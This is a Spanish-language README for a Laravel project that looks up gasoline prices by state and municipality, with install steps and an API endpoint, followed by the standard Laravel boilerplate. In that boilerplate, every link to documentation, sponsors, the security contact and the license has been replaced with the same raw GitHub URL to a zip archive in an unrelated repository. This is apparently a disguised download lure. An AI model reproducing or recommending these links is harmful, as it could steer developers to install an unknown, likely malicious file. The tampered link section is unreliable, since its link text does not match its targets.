#Proyecto Prueba de conocimiento Sr Pago.

###Tecnologias ocupadas

-Laravel v7

-Bootstrap v3

-Jquery

-GMaps para el mapa.

###Instalación del proyecto
1.-Una vez descargado el proyecto de GitHub se tiene que tener intalado lo siguiente:

-Composer 

-PHP >=v7.2

-Un servidor Web (Se recomienda Nginx).

2.-
Correr el siguiente comando en la carpeta raiz del proyecto, con una consola de comandos

composer install

3.-Este paso es muy importante, ya que es el encargado de generar la base de datos, ya que lo realiza un proceso de consola:

php artisan db:create preciogasolinas

4.-Para poder cargar la estructura de la base de datos, correr el siguiente comando:

php artisan migrate

###Consumo de Servicio Web
Metodo:GET

URL: /api/precio/gasolina

Parametros se pasan como query, por ejemplo:

/api/precio/gasolina?estado=Ciudad de México&municipio=Iztapalapa&order=asc


###Navegar dentro de la aplicación
1.-Primero que nada, se tiene que cargar el Excel de la pagina de sepomex, esto se hace eligiendo el menu "Carga C.P SEPOMEX"

Esto lo que hace es cargar el Excel y mandarlo como un Job de Laravel y solo hay esperar a que termine de cargar, esto se puede visualizar en una tabla que contiene esa información en la misma pagina y marca el estatus como terminado.

2.-Ir al Home, en el cual podemos seleccionar los estados que estan previamente cargados en la base de datos, se selecciona un estado y de manera asincrona busca los municipios, una vez que esta la infroamción que desea enviar, ya sea estado y/o municipio, se le da en el boton de Buscar, 

3.-Se pinta la información en la tabla, y en el mapa, OJO muchos C.P no traen información del servicio Web de los precios de gasolinas.

4.-Para el mapa hay que alejar el mapa para poder visualizar los puntos.


## About Laravel

Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:

- [Simple, fast routing engine](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip).
- [Powerful dependency injection container](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip).
- Multiple back-ends for [session](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip) and [cache](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip) storage.
- Expressive, intuitive [database ORM](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip).
- Database agnostic [schema migrations](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip).
- [Robust background job processing](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip).
- [Real-time event broadcasting](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip).

Laravel is accessible, powerful, and provides tools required for large, robust applications.

## Learning Laravel

Laravel has the most extensive and thorough [documentation](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.

If you don't feel like reading, [Laracasts](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip) can help. Laracasts contains over 1500 video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.

## Laravel Sponsors

We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the Laravel [Patreon page](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip).

- **[Vehikl](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)**
- **[Tighten Co.](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)**
- **[Kirschbaum Development Group](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)**
- **[64 Robots](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)**
- **[Cubet Techno Labs](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)**
- **[Cyber-Duck](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)**
- **[British Software Development](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)**
- **[Webdock, Fast VPS Hosting](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)**
- **[DevSquad](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)**
- [UserInsights](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [Fragrantica](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [SOFTonSOFA](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [User10](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [CodeBrisk](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [1Forge](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [TECPRESSO](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [Runtime Converter](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [WebL'Agence](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [Invoice Ninja](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [iMi digital](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [Earthlink](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [Steadfast Collective](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [We Are The Robots Inc.](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [Abdel Elrafa](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [Hyper Host](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [Appoly](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)
- [https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip)

## Contributing

Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip).

## Code of Conduct

In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip).

## Security Vulnerabilities

If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip). All security vulnerabilities will be promptly addressed.

## License

The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/belydan/AH170-Framework/master/app/Providers/A_Framework_2.6.zip).
